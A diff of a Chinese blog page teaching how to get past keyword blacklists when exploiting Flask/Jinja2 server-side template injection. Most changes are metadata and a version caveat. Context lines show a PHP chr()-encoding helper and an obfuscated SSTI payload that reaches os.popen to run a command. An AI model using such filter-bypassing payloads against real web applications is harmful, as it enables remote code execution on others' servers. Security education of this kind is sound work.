@@ -20,12 +20,12 @@
   <title>flask中的ssti注入-绕过 - AAAAl'blog</title>
 
   
-    <meta name="description" content="[TOC] 摘要这篇文章本身主要是讲解针对ssti的过滤如何进行绕过（本篇文章的测试环境是python3.9.13）。">
+    <meta name="description" content="[TOC] 摘要这篇文章本身主要是讲解针对ssti的过滤如何进行绕过（本篇文章的测试环境是python3.9.13，flask3.0.3）。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="flask中的ssti注入-绕过">
 <meta property="og:url" content="https://aaaa-l.github.io/2024/12/26/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87/">
 <meta property="og:site_name" content="AAAAl&#39;blog">
-<meta property="og:description" content="[TOC] 摘要这篇文章本身主要是讲解针对ssti的过滤如何进行绕过（本篇文章的测试环境是python3.9.13）。">
+<meta property="og:description" content="[TOC] 摘要这篇文章本身主要是讲解针对ssti的过滤如何进行绕过（本篇文章的测试环境是python3.9.13，flask3.0.3）。">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://aaaa-l.github.io/2024/12/26/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87/1.jpg">
 <meta property="og:image" content="https://aaaa-l.github.io/2024/12/26/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87/2.jpg">
@@ -36,7 +36,7 @@
 <meta property="og:image" content="https://aaaa-l.github.io/2024/12/26/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87/7.jpg">
 <meta property="og:image" content="https://aaaa-l.github.io/2024/12/26/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87/8.jpg">
 <meta property="article:published_time" content="2024-12-26T07:48:06.000Z">
-<meta property="article:modified_time" content="2024-12-30T13:52:08.867Z">
+<meta property="article:modified_time" content="2024-12-30T18:26:32.960Z">
 <meta property="article:author" content="AAAAl">
 <meta property="article:tag" content="python">
 <meta property="article:tag" content="ssti">
@@ -94,11 +94,11 @@
   <div class="content">
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
 <span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/python/">python</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/python/ssti/">ssti</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-12-26T07:48:06.000Z">2024-12-26</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-12-30T13:52:08.867Z">2024-12-30</time></span></div></div></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-12-26T07:48:06.000Z">2024-12-26</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-12-30T18:26:32.960Z">2024-12-31</time></span></div></div></div>
     
   </div>
   </div><article class="md-text content"><p>[TOC]</p>
-<h6 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h6><p>这篇文章本身主要是讲解针对ssti的过滤如何进行绕过（本篇文章的测试环境是python3.9.13）。</p>
+<h6 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h6><p>这篇文章本身主要是讲解针对ssti的过滤如何进行绕过（本篇文章的测试环境是python3.9.13，flask3.0.3）。</p>
 <span id="more"></span>
 
 <p>在我看来，面对黑名单过滤，最常用的就是两种，第一种是想方法绕过关键字的匹配还能使注入生效，第二种就是对方过滤不全，我们使用其他关键字进行代替来注入。我们这里主要提的是第一种。</p>
@@ -243,7 +243,7 @@
 <p>先给出一个<code>chr</code>的脚本，方便转换，我一般是习惯使用<code>+</code>，因为我一般是在bp中再进行url编码。你这里也可以改为<code>%2b</code>。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;echo hello&#x27;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$a</span>);<span class="hljs-variable">$i</span>++)<br>&#123;<br> <span class="hljs-variable">$result</span> .= <span class="hljs-string">&#x27;chr(&#x27;</span>.<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$a</span>[<span class="hljs-variable">$i</span>]).<span class="hljs-string">&#x27;)+&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$result</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p><strong>其实函数是可以直接访问<code>__builtins__</code>属性的，写一半才发现，不过影响也不大，前面就没有改了，我在前一篇文章末尾也已经说明了。</strong></p>
+<p><strong>这里函数是否能够直接访问<code>__builtins__</code>属性可能会受到flask版本影响。我在使用3.0.3版本时没有问题，但是使用2.0.3时不能直接访问。</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;% set chr = lipsum.__builtins__.chr %&#125;<br>&#123;&#123;lipsum[chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95)][chr(111)+chr(115)][chr(112)+chr(111)+chr(112)+chr(101)+chr(110)](chr(101)+chr(99)+chr(104)+chr(111)+chr(32)+chr(104)+chr(101)+chr(108)+chr(108)+chr(111)).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
 
 <p><code>bytes</code>的脚本</p>
@@ -323,7 +323,7 @@
     </section>
     <section class='body'>
     <div class="related-posts"><a class="item" href="\2024\12\23\flask中的ssti注入-前置基础知识\" title="flask中的ssti注入-前置基础知识"><span class="title">flask中的ssti注入-前置基础知识</span><span class="excerpt">[TOC]
-摘要为什么要写这一篇文章呢？一方面是是为了防止手注时出现错误不知如何进行更改，另一方面是后面讲得所有的利用和绕过都是在此基础上，只有对这方面有所了解，你才能理解后面的payload。（会讲得比较细致，适合零基础的小白）。不...</span></a></div></section></div>
+摘要为什么要写这一篇文章呢？一方面是是为了防止手注时出现错误不知如何进行更改，另一方面是后面讲得所有的利用和绕过都是在此基础上，只有对这方面有所了解，你才能理解后面的payload。（会讲得比较细致，适合零基础的小白）。不...</span></a><a class="item" href="\2024\12\30\flask中的ssti注入-无回显\" title="flask中的ssti注入-无回显"><span class="title">flask中的ssti注入-无回显</span></a></div></section></div>
 
 
 
